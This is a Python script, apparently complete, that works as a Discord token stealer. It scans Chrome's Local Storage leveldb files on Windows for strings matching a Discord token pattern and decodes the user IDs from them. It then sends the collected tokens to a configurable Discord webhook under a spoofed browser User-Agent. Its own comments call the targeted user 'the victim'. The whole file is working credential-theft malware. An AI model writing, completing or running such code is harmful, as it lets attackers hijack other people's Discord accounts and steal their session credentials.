import re
import os
import base64
import typing
import json
import urllib.request


TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type":
        "application/json",
    "User-Agent":
        "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}
WEBHOOK_URL = "YOUR WEBHOOK URL"


def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
    request = urllib.request.Request(
        api_url, data=json.dumps(data).encode(),
        headers=REQUEST_HEADERS
    )

    with urllib.request.urlopen(request) as response:
        response_status = response.status

    return response_status


def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:

    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
        try:
            file_contents = text_file.read()
        except PermissionError:
            return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens if tokens else None


def get_user_id_from_token(token: str) -> typing.Union[None, str]:
    """
    Confirming that the portion of a string before the first dot can be decoded
    from base64 offers a useful, though not infallible, method for identifying
    potential Discord tokens. This is informed by the fact that the initial
    segment of a Discord token usually encodes the user ID in base64. However,
    this test is not guaranteed to be 100% accurate in every case.

    Parameters:
        token (str): Suspected Discord token represented as a string.

    Returns:
        A string representing the Discord user ID to which the token belongs,
        if the first part of the token can be successfully decoded. Otherwise,
        None.
    """
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None

    return discord_user_id


def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
    """
    The function collects discord tokens for each user ID to manage the
    occurrence of both valid and expired Discord tokens, which happens when a
    user updates their password, triggering a change in their token. Lacking
    the capability to differentiate between valid and expired tokens without
    making queries to the Discord API, the function compiles every discovered
    token into the returned set. It is designed for these tokens to be
    validated later, in a process separate from the initial collection and not
    on the victim's machine.

    Parameters:
        base_path (str): path containing files where tokens may be located.
    """
    file_paths = [
        os.path.join(base_path, filename) for filename in os.listdir(base_path)
    ]

    id_to_tokens: typing.Dict[str, set] = dict()

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if potential_tokens is None:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if discord_user_id is None:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()

            id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens if id_to_tokens else None


def send_tokens_to_webhook(
    webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
) -> int:
    """
    Caution: In scenarios where the victim has logged into multiple Discord
    accounts or has frequently changed their password, the accumulation of
    tokens may result in a message that surpasses the character limit,
    preventing it from being sent. There are no plans to introduce code
    modifications to segment the message for compliance with character
    constraints.
    """
    fields: list[dict] = list()

    for user_id, tokens in user_id_to_token.items():
        fields.append({
            "name": user_id,
            "value": "\n".join(tokens)
        })

    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}

    make_post_request(webhook_url, data)


def main() -> None:

    chrome_path = os.path.join(
        os.getenv("LOCALAPPDATA"),
        r"Google\Chrome\User Data\Default\Local Storage\leveldb"
    )

    tokens = get_tokens_from_path(chrome_path)

    if tokens is None:
        return

    send_tokens_to_webhook(WEBHOOK_URL, tokens)


if __name__ == "__main__":
    main()
